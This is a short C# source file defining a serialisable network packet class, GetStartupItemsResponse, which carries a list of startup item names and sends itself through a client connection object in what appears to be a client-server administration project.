using Serveur.Controllers.Server;
using System.Collections.Generic;
using ZeroFormatter;

namespace Serveur.Packets.ClientPackets
{
    [ZeroFormattable]
    public class GetStartupItemsResponse : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetStartupItemsResponse;
            }
        }

        [Index(0)]
        public virtual List<string> startupItems { get; set; }

        public GetStartupItemsResponse()
        {
        }

        public GetStartupItemsResponse(List<string> startupItems)
        {
            this.startupItems = startupItems;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
